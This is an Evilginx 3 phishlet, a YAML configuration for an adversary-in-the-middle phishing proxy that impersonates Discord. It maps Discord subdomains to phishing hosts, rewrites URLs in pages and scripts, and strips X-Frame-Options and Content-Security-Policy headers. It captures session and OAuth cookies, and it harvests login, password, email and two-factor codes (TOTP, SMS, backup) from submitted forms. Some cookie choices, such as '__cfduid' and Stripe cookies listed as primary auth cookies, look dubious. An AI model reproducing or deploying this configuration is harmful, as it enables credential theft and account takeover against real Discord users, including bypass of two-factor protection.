min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://discord.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'discord.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'discord.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'discord.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'gateway', orig_sub: 'gateway', domain: 'discord.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'media', orig_sub: 'media', domain: 'discord.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'images', orig_sub: 'images', domain: 'discordapp.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Discord domain URLs
  - {triggers_on: 'www.discord.com', orig_sub: 'www', domain: 'discord.com', search: 'https://www\\.discord\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.discord.com', orig_sub: 'api', domain: 'discord.com', search: 'https://api\\.discord\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.discord.com', orig_sub: 'cdn', domain: 'discord.com', search: 'https://cdn\\.discord\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.discord.com', orig_sub: 'gateway', domain: 'discord.com', search: 'wss://gateway\\.discord\\.gg', replace: 'wss://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  - {triggers_on: 'www.discord.com', orig_sub: 'media', domain: 'discord.com', search: 'https://media\\.discordapp\\.net', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.discord.com', orig_sub: 'images', domain: 'discordapp.com', search: 'https://[a-z0-9-]+\\.discordapp\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.discord.com', orig_sub: 'www', domain: 'discord.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.discord.com', orig_sub: 'www', domain: 'discord.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.discord.com', orig_sub: 'api', domain: 'discord.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.discord.com', orig_sub: 'api', domain: 'discord.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Discord authentication cookies
  - domain: '.discord.com'
    keys: ['__cfduid', '__dcfduid', '__sdcfduid', '__stripe_mid', '__stripe_sid']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.discord.com'
    keys: ['locale', 'preferred_locale', 'theme']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.discord.com'
    keys: ['access_token', 'refresh_token', 'token_type']
    type: 'cookie'
    optional: true
  
  # User and guild cookies
  - domain: '.discord.com'
    keys: ['user_id', 'guild_id', 'channel_id']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'
  
  # Backup codes
  backup_code:
    key: 'backup_code'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/channels/@me'
  - '^/channels/[0-9]+'
  - '^/library'
  - '^/store'
  - '^/settings'
  - '^/activity'

login:
  domain: 'www.discord.com'
  path: '/login'

